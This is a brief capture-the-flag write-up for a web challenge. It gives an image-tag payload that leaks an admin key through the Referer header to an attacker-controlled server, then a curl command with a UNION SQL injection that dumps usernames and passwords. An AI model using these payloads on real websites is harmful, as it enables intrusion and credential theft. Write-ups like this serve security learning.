The Task:

> Good evening fellow hackers, your task is simple: find the password used by the user "sectalk" to register on the website.
  Basic Auth: user / th1s1ss0s3c_r3

First, post something with a link to website you control. I setup a tiny http server on one of my machines, but it's actually better to use https://requestb.in/ for it.

```html
  <img src="http://your-server-here/?some=params">
```

Then flag the image, admin will.

Referrer leaks admin key:

  Referer: http://wasp.nobe4.fr:9876/check/245?admin_key=Uzg2NmU4NjZjODY2dTg2NnI4NjZlODY2Szg2NmU4NjZ5ODY2

Check that url. use `curl -X POST` to access it.

Sql inject that id field, eventually getting to:

    curl -s --header 'Authorization: Basic dXNlcjp0aDFzMXNzMHMzY19yMw==' -X POST "http://wasp.nobe4.fr:9876/check/1 union (select id,id,id,id,name,password from users)?admin_key=Uzg2NmU4NjZjODY2dTg2NnI4NjZlODY2Szg2NmU4NjZ5ODY2"

Then MD5 reverse by googling -> `goodjob`. Done!

There were a lot of distracting false paths. Like admin key is base64 of something like "S418e418c418u418r418e418K418e418y418", but none of that really mattered.
